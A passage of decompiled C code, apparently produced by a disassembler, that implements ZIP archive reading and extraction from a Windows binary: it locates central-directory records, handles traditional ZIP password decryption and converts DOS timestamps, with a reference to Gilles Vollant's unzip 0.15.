    local_18 = 0xffff;
    if (uVar2 < 0xffff) {
      local_18 = uVar2;
    }
    _Memory = _malloc(0x404);
    if (_Memory == (void *)0x0) {
      local_c = -1;
    }
    else {
      local_c = -1;
      local_10 = 4;
      while (local_10 < local_18) {
        if (local_18 < local_10 + 0x400) {
          local_10 = local_18;
        }
        else {
          local_10 = local_10 + 0x400;
        }
        iVar1 = uVar2 - local_10;
        if (uVar2 - iVar1 < 0x405) {
          local_28 = uVar2 - iVar1;
        }
        else {
          local_28 = 0x404;
        }
        iVar3 = FUN_0040d500(param_1,iVar1,0);
        if ((iVar3 != 0) || (uVar4 = FUN_0040d5e0(_Memory,local_28,1,param_1), uVar4 != 1)) break;
        iVar3 = local_28 - 3;
        do {
          local_1c = iVar3;
          iVar3 = local_1c + -1;
          if (local_1c < 0) goto LAB_0040d967;
        } while ((((*(char *)((int)_Memory + iVar3) != 'P') ||
                  (*(char *)((int)_Memory + local_1c) != 'K')) ||
                 (*(char *)((int)_Memory + local_1c + 1) != '\x05')) ||
                (*(char *)((int)_Memory + local_1c + 2) != '\x06'));
        local_c = iVar1 + iVar3;
LAB_0040d967:
        if (local_c != 0) break;
      }
      if (_Memory != (void *)0x0) {
        _free(_Memory);
      }
    }
  }
  else {
    local_c = -1;
  }
  return local_c;
}



char ** __cdecl FUN_0040d990(char *param_1)

{
  int iVar1;
  int iVar2;
  char **ppcVar3;
  char **ppcVar4;
  int local_a0;
  char *local_9c;
  int local_98;
  int local_94;
  int local_90;
  int local_80;
  int local_7c;
  int local_78 [22];
  undefined4 local_20;
  int local_18;
  int local_14;
  int local_10;
  char **local_c;
  int local_8;
  
  if (param_1 == (char *)0x0) {
    local_c = (char **)0x0;
  }
  else if (s__unzip_0_15_Copyright_1998_Gille_0042633c[0] == ' ') {
    local_a0 = 0;
    iVar1 = FUN_0040d800(param_1);
    if (iVar1 == -1) {
      local_a0 = -1;
    }
    iVar2 = FUN_0040d500(param_1,iVar1,0);
    if (iVar2 != 0) {
      local_a0 = -1;
    }
    iVar2 = FUN_0040d750(param_1,&local_10);
    if (iVar2 != 0) {
      local_a0 = -1;
    }
    iVar2 = FUN_0040d6e0(param_1,&local_8);
    if (iVar2 != 0) {
      local_a0 = -1;
    }
    iVar2 = FUN_0040d6e0(param_1,&local_18);
    if (iVar2 != 0) {
      local_a0 = -1;
    }
    iVar2 = FUN_0040d6e0(param_1,&local_98);
    if (iVar2 != 0) {
      local_a0 = -1;
    }
    iVar2 = FUN_0040d6e0(param_1,&local_14);
    if (iVar2 != 0) {
      local_a0 = -1;
    }
    if (((local_14 != local_98) || (local_18 != 0)) || (local_8 != 0)) {
      local_a0 = -0x67;
    }
    iVar2 = FUN_0040d750(param_1,&local_7c);
    if (iVar2 != 0) {
      local_a0 = -1;
    }
    iVar2 = FUN_0040d750(param_1,local_78);
    if (iVar2 != 0) {
      local_a0 = -1;
    }
    iVar2 = FUN_0040d6e0(param_1,&local_94);
    if (iVar2 != 0) {
      local_a0 = -1;
    }
    if (((uint)(iVar1 + *(int *)(param_1 + 7)) < (uint)(local_78[0] + local_7c)) && (local_a0 == 0))
    {
      local_a0 = -0x67;
    }
    if (local_a0 == 0) {
      local_9c = param_1;
      local_90 = (iVar1 + *(int *)(param_1 + 7)) - (local_78[0] + local_7c);
      local_20 = 0;
      *(undefined4 *)(param_1 + 7) = 0;
      local_80 = iVar1;
      local_c = (char **)_malloc(0x80);
      ppcVar3 = &local_9c;
      ppcVar4 = local_c;
      for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {
        *ppcVar4 = *ppcVar3;
        ppcVar3 = ppcVar3 + 1;
        ppcVar4 = ppcVar4 + 1;
      }
      FUN_0040e110(local_c);
    }
    else {
      FUN_0040d440(param_1);
      local_c = (char **)0x0;
    }
  }
  else {
    FUN_0040d440(param_1);
    local_c = (char **)0x0;
  }
  return local_c;
}



undefined4 __cdecl FUN_0040dbf0(void **param_1)

{
  undefined4 uVar1;
  
  if (param_1 == (void **)0x0) {
    uVar1 = 0xffffff9a;
  }
  else {
    if (param_1[0x1f] != (void *)0x0) {
      FUN_0040eb60((int)param_1);
    }
    FUN_0040d440(*param_1);
    if (param_1 != (void **)0x0) {
      _free(param_1);
    }
    uVar1 = 0;
  }
  return uVar1;
}



void __cdecl FUN_0040dc50(uint param_1,int *param_2)

{
  param_2[3] = param_1 >> 0x10 & 0x1f;
  param_2[4] = ((param_1 >> 0x10 & 0x1e0) >> 5) - 1;
  param_2[5] = (param_1 >> 0x19) + 0x7bc;
  param_2[2] = (param_1 & 0xf800) >> 0xb;
  param_2[1] = (param_1 & 0x7e0) >> 5;
  *param_2 = (param_1 & 0x1f) << 1;
  return;
}



int __cdecl
FUN_0040dcd0(char **param_1,int *param_2,int *param_3,void *param_4,uint param_5,void *param_6,
            uint param_7,void *param_8,uint param_9)

{
  int iVar1;
  uint uVar2;
  int *piVar3;
  uint local_74;
  uint local_70;
  uint local_6c;
  int local_68;
  int local_64;
  int local_60;
  int local_5c [4];
  uint local_4c;
  int local_48;
  int local_44;
  int local_40;
  uint local_3c;
  uint local_38;
  uint local_34;
  int local_30;
  int local_2c;
  int local_28;
  int local_24 [6];
  int local_c;
  char **local_8;
  
  local_68 = 0;
  local_60 = 0;
  if (param_1 == (char **)0x0) {
    local_68 = -0x66;
  }
  else {
    local_8 = param_1;
    iVar1 = FUN_0040d500(*param_1,(int)(param_1[5] + (int)param_1[3]),0);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    if (local_68 == 0) {
      iVar1 = FUN_0040d750(*local_8,&local_c);
      if (iVar1 == 0) {
        if (local_c != 0x2014b50) {
          local_68 = -0x67;
        }
      }
      else {
        local_68 = -1;
      }
    }
    iVar1 = FUN_0040d6e0(*local_8,local_5c);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d6e0(*local_8,local_5c + 1);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d6e0(*local_8,local_5c + 2);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d6e0(*local_8,local_5c + 3);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d750(*local_8,(int *)&local_4c);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    FUN_0040dc50(local_4c,local_24);
    iVar1 = FUN_0040d750(*local_8,&local_48);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d750(*local_8,&local_44);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d750(*local_8,&local_40);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d6e0(*local_8,(int *)&local_3c);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d6e0(*local_8,(int *)&local_38);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d6e0(*local_8,(int *)&local_34);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d6e0(*local_8,&local_30);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d6e0(*local_8,&local_2c);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d750(*local_8,&local_28);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    iVar1 = FUN_0040d750(*local_8,&local_64);
    if (iVar1 != 0) {
      local_68 = -1;
    }
    local_60 = local_60 + local_3c;
    if ((local_68 == 0) && (param_4 != (void *)0x0)) {
      if (local_3c < param_5) {
        *(undefined *)((int)param_4 + local_3c) = 0;
        local_6c = local_3c;
      }
      else {
        local_6c = param_5;
      }
      if (((local_3c != 0) && (param_5 != 0)) &&
         (uVar2 = FUN_0040d5e0(param_4,local_6c,1,*local_8), uVar2 != 1)) {
        local_68 = -1;
      }
      local_60 = local_60 - local_6c;
    }
    if ((local_68 == 0) && (param_6 != (void *)0x0)) {
      if (local_38 < param_7) {
        local_70 = local_38;
      }
      else {
        local_70 = param_7;
      }
      if (local_60 != 0) {
        iVar1 = FUN_0040d500(*local_8,local_60,1);
        if (iVar1 == 0) {
          local_60 = 0;
        }
        else {
          local_68 = -1;
        }
      }
      if (((local_38 != 0) && (param_7 != 0)) &&
         (uVar2 = FUN_0040d5e0(param_6,local_70,1,*local_8), uVar2 != 1)) {
        local_68 = -1;
      }
      local_60 = (local_38 - local_70) + local_60;
    }
    else {
      local_60 = local_60 + local_38;
    }
    if ((local_68 == 0) && (param_8 != (void *)0x0)) {
      if (local_34 < param_9) {
        *(undefined *)((int)param_8 + local_34) = 0;
        local_74 = local_34;
      }
      else {
        local_74 = param_9;
      }
      if ((local_60 != 0) && (iVar1 = FUN_0040d500(*local_8,local_60,1), iVar1 != 0)) {
        local_68 = -1;
      }
      if (((local_34 != 0) && (param_9 != 0)) &&
         (uVar2 = FUN_0040d5e0(param_8,local_74,1,*local_8), uVar2 != 1)) {
        local_68 = -1;
      }
    }
    if ((local_68 == 0) && (param_2 != (int *)0x0)) {
      piVar3 = local_5c;
      for (iVar1 = 0x14; iVar1 != 0; iVar1 = iVar1 + -1) {
        *param_2 = *piVar3;
        piVar3 = piVar3 + 1;
        param_2 = param_2 + 1;
      }
    }
    if ((local_68 == 0) && (param_3 != (int *)0x0)) {
      *param_3 = local_64;
    }
  }
  return local_68;
}



void __cdecl
FUN_0040e0e0(char **param_1,int *param_2,void *param_3,uint param_4,void *param_5,uint param_6,
            void *param_7,uint param_8)

{
  FUN_0040dcd0(param_1,param_2,(int *)0x0,param_3,param_4,param_5,param_6,param_7,param_8);
  return;
}



int __cdecl FUN_0040e110(char **param_1)

{
  int iVar1;
  
  if (param_1 == (char **)0x0) {
    iVar1 = -0x66;
  }
  else {
    param_1[5] = param_1[9];
    param_1[4] = (char *)0x0;
    iVar1 = FUN_0040dcd0(param_1,(int *)(param_1 + 10),(int *)(param_1 + 0x1e),(void *)0x0,0,
                         (void *)0x0,0,(void *)0x0,0);
    param_1[6] = (char *)(uint)(iVar1 == 0);
  }
  return iVar1;
}



int __cdecl FUN_0040e180(char **param_1)

{
  int iVar1;
  
  if (param_1 == (char **)0x0) {
    iVar1 = -0x66;
  }
  else if (param_1[6] == (char *)0x0) {
    iVar1 = -100;
  }
  else if (param_1[4] + 1 == param_1[1]) {
    iVar1 = -100;
  }
  else {
    param_1[5] = param_1[0x12] + 0x2e + (int)param_1[0x13] + (int)param_1[0x14] + (int)param_1[5];
    param_1[4] = param_1[4] + 1;
    iVar1 = FUN_0040dcd0(param_1,(int *)(param_1 + 10),(int *)(param_1 + 0x1e),(void *)0x0,0,
                         (void *)0x0,0,(void *)0x0,0);
    param_1[6] = (char *)(uint)(iVar1 == 0);
  }
  return iVar1;
}



int __cdecl FUN_0040e240(char **param_1,char **param_2,char **param_3,int *param_4)

{
  int iVar1;
  uint local_1c;
  char *local_18;
  int local_14;
  int local_10;
  int local_c;
  char *local_8;
  
  local_14 = 0;
  *param_2 = (char *)0x0;
  *param_3 = (char *)0x0;
  *param_4 = 0;
  iVar1 = FUN_0040d500(*param_1,(int)(param_1[0x1e] + (int)param_1[3]),0);
  if (iVar1 == 0) {
    if (local_14 == 0) {
      iVar1 = FUN_0040d750(*param_1,&local_10);
      if (iVar1 == 0) {
        if (local_10 != 0x4034b50) {
          local_14 = -0x67;
        }
      }
      else {
        local_14 = -1;
      }
    }
    iVar1 = FUN_0040d6e0(*param_1,(int *)&local_8);
    if (iVar1 != 0) {
      local_14 = -1;
    }
    iVar1 = FUN_0040d6e0(*param_1,(int *)&local_1c);
    if (iVar1 != 0) {
      local_14 = -1;
    }
    iVar1 = FUN_0040d6e0(*param_1,(int *)&local_8);
    if (iVar1 == 0) {
      if ((local_14 == 0) && (local_8 != param_1[0xd])) {
        local_14 = -0x67;
      }
    }
    else {
      local_14 = -1;
    }
    if (((local_14 == 0) && (param_1[0xd] != (char *)0x0)) && (param_1[0xd] != (char *)0x8)) {
      local_14 = -0x67;
    }
    iVar1 = FUN_0040d750(*param_1,(int *)&local_8);
    if (iVar1 != 0) {
      local_14 = -1;
    }
    iVar1 = FUN_0040d750(*param_1,(int *)&local_8);
    if (iVar1 == 0) {
      if (((local_14 == 0) && (local_8 != param_1[0xf])) && ((local_1c & 8) == 0)) {
        local_14 = -0x67;
      }
    }
    else {
      local_14 = -1;
    }
    iVar1 = FUN_0040d750(*param_1,(int *)&local_8);
    if (iVar1 == 0) {
      if (((local_14 == 0) && (local_8 != param_1[0x10])) && ((local_1c & 8) == 0)) {
        local_14 = -0x67;
      }
    }
    else {
      local_14 = -1;
    }
    iVar1 = FUN_0040d750(*param_1,(int *)&local_8);
    if (iVar1 == 0) {
      if (((local_14 == 0) && (local_8 != param_1[0x11])) && ((local_1c & 8) == 0)) {
        local_14 = -0x67;
      }
    }
    else {
      local_14 = -1;
    }
    iVar1 = FUN_0040d6e0(*param_1,(int *)&local_18);
    if (iVar1 == 0) {
      if ((local_14 == 0) && (local_18 != param_1[0x12])) {
        local_14 = -0x67;
      }
    }
    else {
      local_14 = -1;
    }
    *param_2 = *param_2 + (int)local_18;
    iVar1 = FUN_0040d6e0(*param_1,&local_c);
    if (iVar1 != 0) {
      local_14 = -1;
    }
    *param_3 = param_1[0x1e] + 0x1e + (int)local_18;
    *param_4 = local_c;
    *param_2 = *param_2 + local_c;
  }
  else {
    local_14 = -1;
  }
  return local_14;
}



undefined4 __cdecl FUN_0040e4c0(char **param_1,char *param_2)

{
  undefined4 uVar1;
  int iVar2;
  void *pvVar3;
  char *local_28;
  char *local_24;
  int local_20;
  uint local_1c;
  char *local_18;
  void **local_14;
  undefined local_d;
  void *local_c;
  char **local_8;
  
  if (param_1 == (char **)0x0) {
    uVar1 = 0xffffff9a;
  }
  else {
    local_8 = param_1;
    if (param_1[6] == (char *)0x0) {
      uVar1 = 0xffffff9a;
    }
    else {
      if (param_1[0x1f] != (char *)0x0) {
        FUN_0040eb60((int)param_1);
      }
      iVar2 = FUN_0040e240(local_8,&local_18,&local_24,(int *)&local_c);
      if (iVar2 == 0) {
        local_14 = (void **)_malloc(0x7e);
        if (local_14 == (void **)0x0) {
          uVar1 = 0xffffff98;
        }
        else {
          pvVar3 = _malloc(0x4000);
          *local_14 = pvVar3;
          local_14[0x11] = local_24;
          local_14[0x12] = local_c;
          local_14[0x13] = (void *)0x0;
          if (*local_14 == (void *)0x0) {
            if (local_14 != (void **)0x0) {
              _free(local_14);
            }
            uVar1 = 0xffffff98;
          }
          else {
            local_14[0x10] = (void *)0x0;
            local_1c = (uint)(local_8[0xd] == (char *)0x0);
            local_14[0x15] = local_8[0xf];
            local_14[0x14] = (void *)0x0;
            local_14[0x19] = local_8[0xd];
            local_14[0x18] = *local_8;
            local_14[0x1a] = local_8[3];
            local_14[6] = (void *)0x0;
            if (local_1c == 0) {
              local_14[9] = (void *)0x0;
              local_14[10] = (void *)0x0;
              local_14[0xb] = (void *)0x0;
              local_20 = FUN_0040ca80((int)(local_14 + 1));
              if (local_20 == 0) {
                local_14[0x10] = (void *)0x1;
              }
            }
            local_14[0x16] = local_8[0x10];
            local_14[0x17] = local_8[0x11];
            *(bool *)(local_14 + 0x1b) = ((uint)local_8[0xc] & 1) != 0;
            local_d = ((uint)local_8[0xc] & 8) != 0;
            if ((bool)local_d) {
              *(char *)((int)local_14 + 0x7d) = (char)((uint)local_8[0xe] >> 8);
            }
            else {
              *(char *)((int)local_14 + 0x7d) = (char)((uint)local_8[0xf] >> 0x18);
            }
            *(uint *)((int)local_14 + 0x79) = -(uint)(*(char *)(local_14 + 0x1b) != '\0') & 0xc;
            *(undefined4 *)((int)local_14 + 0x6d) = 0x12345678;
            *(undefined4 *)((int)local_14 + 0x71) = 0x23456789;
            *(undefined4 *)((int)local_14 + 0x75) = 0x34567890;
            for (local_28 = param_2; (local_28 != (char *)0x0 && (*local_28 != '\0'));
                local_28 = local_28 + 1) {
              FUN_0040c620((uint *)((int)local_14 + 0x6d),*local_28);
            }
            local_14[0xf] = local_8[0x1e] + 0x1e + (int)local_18;
            local_14[2] = (void *)0x0;
            local_8[0x1f] = (char *)local_14;
            uVar1 = 0;
          }
        }
      }
      else {
        uVar1 = 0xffffff99;
      }
    }
  }
  return uVar1;
}



uint __cdecl FUN_0040e740(int param_1,void *param_2,void *param_3,undefined *param_4)

{
  char cVar1;
  void **ppvVar2;
  byte *pbVar3;
  void *pvVar4;
  byte bVar5;
  int iVar6;
  uint uVar7;
  void *pvVar8;
  void *pvVar9;
  void *local_30;
  void *local_2c;
  void *local_24;
  void *local_1c;
  void *local_18;
  uint local_14;
  uint local_10;
  
  local_14 = 0;
  local_10 = 0;
  if (param_4 != (undefined *)0x0) {
    *param_4 = 0;
  }
  if (param_1 == 0) {
    local_14 = 0xffffff9a;
  }
  else {
    ppvVar2 = *(void ***)(param_1 + 0x7c);
    if (ppvVar2 == (void **)0x0) {
      local_14 = 0xffffff9a;
    }
    else if (*ppvVar2 == (void *)0x0) {
      local_14 = 0xffffff9c;
    }
    else if (param_3 == (void *)0x0) {
      local_14 = 0;
    }
    else {
      ppvVar2[4] = param_2;
      ppvVar2[5] = param_3;
      if (ppvVar2[0x17] < param_3) {
        ppvVar2[5] = ppvVar2[0x17];
      }
      do {
        while( true ) {
          if (ppvVar2[5] == (void *)0x0) goto LAB_0040eb3f;
          if ((ppvVar2[2] == (void *)0x0) && (ppvVar2[0x16] != (void *)0x0)) {
            local_1c = (void *)0x4000;
            if (ppvVar2[0x16] < (void *)0x4000) {
              local_1c = ppvVar2[0x16];
            }
            if (local_1c == (void *)0x0) {
              if (param_4 != (undefined *)0x0) {
                *param_4 = 1;
              }
              return 0;
            }
            iVar6 = FUN_0040d500((char *)ppvVar2[0x18],(int)ppvVar2[0xf] + (int)ppvVar2[0x1a],0);
            if (iVar6 != 0) {
              return 0xffffffff;
            }
            uVar7 = FUN_0040d5e0(*ppvVar2,(uint)local_1c,1,(char *)ppvVar2[0x18]);
            if (uVar7 != 1) {
              return 0xffffffff;
            }
            ppvVar2[0xf] = (void *)((int)ppvVar2[0xf] + (int)local_1c);
            ppvVar2[0x16] = (void *)((int)ppvVar2[0x16] - (int)local_1c);
            ppvVar2[1] = *ppvVar2;
            ppvVar2[2] = local_1c;
            if (*(char *)(ppvVar2 + 0x1b) != '\0') {
              pvVar8 = ppvVar2[1];
              for (local_24 = (void *)0x0; local_24 < local_1c;
                  local_24 = (void *)((int)local_24 + 1)) {
                bVar5 = FUN_0040c6d0((uint *)((int)ppvVar2 + 0x6d),
                                     *(byte *)((int)pvVar8 + (int)local_24));
                *(byte *)((int)pvVar8 + (int)local_24) = bVar5;
              }
            }
          }
          local_18 = *(void **)((int)ppvVar2 + 0x79);
          if (ppvVar2[2] < local_18) {
            local_18 = ppvVar2[2];
          }
          if (local_18 != (void *)0x0) {
            cVar1 = *(char *)((int)local_18 + -1 + (int)ppvVar2[1]);
            ppvVar2[0x17] = (void *)((int)ppvVar2[0x17] - (int)local_18);
            ppvVar2[2] = (void *)((int)ppvVar2[2] - (int)local_18);
            ppvVar2[1] = (void *)((int)ppvVar2[1] + (int)local_18);
            *(int *)((int)ppvVar2 + 0x79) = *(int *)((int)ppvVar2 + 0x79) - (int)local_18;
            if ((*(int *)((int)ppvVar2 + 0x79) == 0) && (cVar1 != *(char *)((int)ppvVar2 + 0x7d))) {
              return 0xffffff96;
            }
          }
          if (ppvVar2[0x19] != (void *)0x0) break;
          if (ppvVar2[5] < ppvVar2[2]) {
            local_30 = ppvVar2[5];
          }
          else {
            local_30 = ppvVar2[2];
          }
          for (local_2c = (void *)0x0; local_2c < local_30; local_2c = (void *)((int)local_2c + 1))
          {
            *(undefined *)((int)ppvVar2[4] + (int)local_2c) =
                 *(undefined *)((int)ppvVar2[1] + (int)local_2c);
          }
          pvVar8 = (void *)FUN_0040c470((uint)ppvVar2[0x14],(byte *)ppvVar2[4],(uint)local_30);
          ppvVar2[0x14] = pvVar8;
          ppvVar2[0x17] = (void *)((int)ppvVar2[0x17] - (int)local_30);
          ppvVar2[2] = (void *)((int)ppvVar2[2] - (int)local_30);
          ppvVar2[5] = (void *)((int)ppvVar2[5] - (int)local_30);
          ppvVar2[4] = (void *)((int)ppvVar2[4] + (int)local_30);
          ppvVar2[1] = (void *)((int)ppvVar2[1] + (int)local_30);
          ppvVar2[6] = (void *)((int)ppvVar2[6] + (int)local_30);
          local_10 = local_10 + (int)local_30;
          if ((ppvVar2[0x17] == (void *)0x0) && (param_4 != (undefined *)0x0)) {
            *param_4 = 1;
          }
        }
        pvVar8 = ppvVar2[6];
        pbVar3 = (byte *)ppvVar2[4];
        local_14 = FUN_0040cc10((byte **)(ppvVar2 + 1),2);
        pvVar4 = ppvVar2[6];
        uVar7 = (int)pvVar4 - (int)pvVar8;
        pvVar9 = (void *)FUN_0040c470((uint)ppvVar2[0x14],pbVar3,uVar7);
        ppvVar2[0x14] = pvVar9;
        ppvVar2[0x17] = (void *)((int)ppvVar2[0x17] - uVar7);
        local_10 = (int)pvVar4 + (local_10 - (int)pvVar8);
        if ((local_14 == 1) || (ppvVar2[0x17] == (void *)0x0)) {
          if (param_4 == (undefined *)0x0) {
            return local_10;
          }
          *param_4 = 1;
          return local_10;
        }
      } while (local_14 == 0);
LAB_0040eb3f:
      if (local_14 == 0) {
        local_14 = local_10;
      }
    }
  }
  return local_14;
}



undefined4 __cdecl FUN_0040eb60(int param_1)

{
  void **_Memory;
  undefined4 local_10;
  
  local_10 = 0;
  if (param_1 == 0) {
    local_10 = 0xffffff9a;
  }
  else {
    _Memory = *(void ***)(param_1 + 0x7c);
    if (_Memory == (void **)0x0) {
      local_10 = 0xffffff9a;
    }
    else {
      if ((_Memory[0x17] == (void *)0x0) && (_Memory[0x14] != _Memory[0x15])) {
        local_10 = 0xffffff97;
      }
      if (*_Memory != (void *)0x0) {
        _free(*_Memory);
        *_Memory = (void *)0x0;
      }
      *_Memory = (void *)0x0;
      if (_Memory[0x10] != (void *)0x0) {
        FUN_0040ca10((int)(_Memory + 1));
      }
      _Memory[0x10] = (void *)0x0;
      if (_Memory != (void **)0x0) {
        _free(_Memory);
      }
      *(undefined4 *)(param_1 + 0x7c) = 0;
    }
  }
  return local_10;
}



undefined8 __cdecl FUN_0040ec30(uint param_1)

{
  longlong lVar1;
  undefined8 uVar2;
  undefined4 local_14;
  int local_10;
  
  lVar1 = __allmul(param_1,(int)param_1 >> 0x1f,10000000,0);
  local_14 = (undefined4)(lVar1 + 0x19db1ded53e8000);
  local_10 = (int)((ulonglong)(lVar1 + 0x19db1ded53e8000) >> 0x20);
  uVar2 = __allshr(0x20,local_10);
  return CONCAT44((int)uVar2,local_14);
}



_FILETIME __cdecl FUN_0040ec80(ushort param_1,ushort param_2)

{
  SYSTEMTIME local_1c;
  _FILETIME local_c;
  
  local_1c.wYear = (short)((int)(uint)param_1 >> 9) + 0x7bc;
  local_1c.wMonth = (ushort)((int)(uint)param_1 >> 5) & 0xf;
  local_1c.wDay = param_1 & 0x1f;
  local_1c.wHour = (WORD)((int)(uint)param_2 >> 0xb);
  local_1c.wMinute = (ushort)((int)(uint)param_2 >> 5) & 0x3f;
  local_1c.wSecond = (WORD)((param_2 & 0x1f) << 1);
  local_1c.wMilliseconds = 0;
  SystemTimeToFileTime(&local_1c,&local_c);
  return local_c;
}



undefined4 * __thiscall FUN_0040ed00(void *this,char *param_1)

{
  char cVar1;
  void *pvVar2;
  char *local_24;
  char *local_20;
  char *local_10;
  
  *(undefined4 *)this = 0;
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  *(undefined4 *)((int)this + 0x238) = 0xffffffff;
  *(undefined4 *)((int)this + 0x23c) = 0;
  *(undefined4 *)((int)this + 0x240) = 0;
  if (param_1 != (char *)0x0) {
    local_10 = param_1;
    do {
      cVar1 = *local_10;
      local_10 = local_10 + 1;
    } while (cVar1 != '\0');
    pvVar2 = operator_new((uint)(local_10 + (1 - (int)(param_1 + 1))));
    *(void **)((int)this + 0x23c) = pvVar2;
    local_20 = param_1;
    local_24 = *(char **)((int)this + 0x23c);
    do {
      cVar1 = *local_20;
      *local_24 = cVar1;
      local_20 = local_20 + 1;
      local_24 = local_24 + 1;
    } while (cVar1 != '\0');
  }
  return (undefined4 *)this;
}



void __fastcall FUN_0040ede0(void *param_1)

{
  if (*(int *)((int)param_1 + 0x23c) != 0) {
    FUN_00410837(*(void **)((int)param_1 + 0x23c));
  }
  *(undefined4 *)((int)param_1 + 0x23c) = 0;
  if (*(int *)((int)param_1 + 0x240) != 0) {
    param_1 = *(void **)((int)param_1 + 0x240);
    FUN_00410837(param_1);
  }
  *(undefined4 *)((int)param_1 + 0x240) = 0;
  return;
}



undefined4 __thiscall FUN_0040ee50(void *this,LPCWSTR param_1,undefined4 param_2,int param_3)

{
  short *psVar1;
  short sVar2;
  DWORD DVar3;
  char **ppcVar4;
  undefined4 *local_30;
  short *local_20;
  undefined4 local_10;
  short local_c;
  char *local_8;
  
                    // WARNING: Load size is inaccurate
  if ((*this == 0) && (*(int *)((int)this + 4) == -1)) {
    GetCurrentDirectoryW(0x104,(LPWSTR)((int)this + 0x244));
    local_20 = (short *)((int)this + 0x244);
    do {
      sVar2 = *local_20;
      local_20 = local_20 + 1;
    } while (sVar2 != 0);
    local_c = *(short *)((int)this + ((int)local_20 - ((int)this + 0x246) >> 1) * 2 + 0x242);
    if ((local_c != 0x5c) && (local_c != 0x2f)) {
      local_30 = (undefined4 *)((int)this + 0x242);
      do {
        psVar1 = (short *)((int)local_30 + 2);
        local_30 = (undefined4 *)((int)local_30 + 2);
      } while (*psVar1 != 0);
      *local_30 = DAT_00426368;
    }
    if ((param_3 == 1) && (DVar3 = SetFilePointer(param_1,0,(PLONG)0x0,1), DVar3 == 0xffffffff)) {
      local_10 = 0x2000000;
    }
    else {
      local_8 = FUN_0040d2c0(param_1,param_2,param_3,&local_10);
      if (local_8 != (char *)0x0) {
        ppcVar4 = FUN_0040d990(local_8);
        *(char ***)this = ppcVar4;
                    // WARNING: Load size is inaccurate
        if (*this == 0) {
          local_10 = 0x200;
        }
        else {
          local_10 = 0;
        }
      }
    }
  }
  else {
    local_10 = 0x1000000;
  }
  return local_10;
}



void __thiscall FUN_0040efa0(void *this,int param_1,int *param_2)

{
  byte bVar1;
  wchar_t wVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  undefined *puVar8;
  int *piVar9;
  bool bVar10;
  _FILETIME _Var11;
  undefined8 uVar12;
  int local_428;
  byte *local_420;
  byte *local_41c;
  int *local_410;
  wchar_t *local_40c;
  int local_400;
  int local_3fc;
  int local_3f8;
  int local_3f4;
  int local_3f0;
  int local_3ec;
  DWORD local_3e8;
  DWORD local_3e4;
  byte local_3c4 [4];
  uint local_3c0;
  char local_3b9;
  wchar_t *local_3b8;
  uint local_3b4 [4];
  undefined4 local_3a4;
  int local_39c;
  int local_398;
  uint local_380;
  WCHAR local_364 [263];
  char local_156;
  undefined local_155;
  FILETIME local_154;
  char *local_14c;
  WCHAR *local_148;
  CHAR local_144 [264];
  uint local_3c;
  uint local_38;
  char *local_34;
  ushort local_30;
  undefined local_2a;
  undefined local_29;
  void *local_28;
  ushort local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  undefined local_11;
  _FILETIME local_10;
  int local_8;
  
  local_3c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
                    // WARNING: Load size is inaccurate
  if ((-2 < param_1) && (param_1 < *(int *)(*this + 4))) {
    if (*(int *)((int)this + 4) != -1) {
                    // WARNING: Load size is inaccurate
      FUN_0040eb60(*this);
    }
    *(undefined4 *)((int)this + 4) = 0xffffffff;
    if ((param_1 == *(int *)((int)this + 0x238)) && (param_1 != -1)) {
      piVar9 = (int *)((int)this + 8);
      for (iVar7 = 0x8c; iVar7 != 0; iVar7 = iVar7 + -1) {
        *param_2 = *piVar9;
        piVar9 = piVar9 + 1;
        param_2 = param_2 + 1;
      }
    }
    else if (param_1 == -1) {
                    // WARNING: Load size is inaccurate
      *param_2 = *(int *)(*this + 4);
      *(undefined2 *)(param_2 + 1) = 0;
      param_2[0x83] = 0;
      param_2[0x84] = 0;
      param_2[0x85] = 0;
      param_2[0x86] = 0;
      param_2[0x87] = 0;
      param_2[0x88] = 0;
      param_2[0x89] = 0;
      param_2[0x8a] = 0;
      param_2[0x8b] = 0;
    }
    else {
                    // WARNING: Load size is inaccurate
      if (param_1 < *(int *)(*this + 0x10)) {
                    // WARNING: Load size is inaccurate
        FUN_0040e110(*this);
      }
                    // WARNING: Load size is inaccurate
      while (*(int *)(*this + 0x10) < param_1) {
                    // WARNING: Load size is inaccurate
        FUN_0040e180(*this);
      }
                    // WARNING: Load size is inaccurate
      FUN_0040e0e0(*this,(int *)local_3b4,local_144,0x104,(void *)0x0,0,(void *)0x0,0);
                    // WARNING: Load size is inaccurate
      local_18 = FUN_0040e240(*this,&local_14c,&local_34,(int *)&local_20);
                    // WARNING: Load size is inaccurate
      if ((local_18 == 0) && (iVar7 = FUN_0040d500(**this,(int)local_34,0), iVar7 == 0)) {
        local_28 = operator_new(local_20);
                    // WARNING: Load size is inaccurate
        uVar6 = FUN_0040d5e0(local_28,1,local_20,**this);
        if (uVar6 == local_20) {
                    // WARNING: Load size is inaccurate
          *param_2 = *(int *)(*this + 0x10);
          MultiByteToWideChar(0xfde9,0,local_144,-1,local_364,0x104);
          local_148 = local_364;
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while( true ) {
                    while( true ) {
                      for (; (*local_148 != L'\0' && (local_148[1] == L':'));
                          local_148 = local_148 + 2) {
                      }
                      if (*local_148 != L'\\') break;
                      local_148 = local_148 + 1;
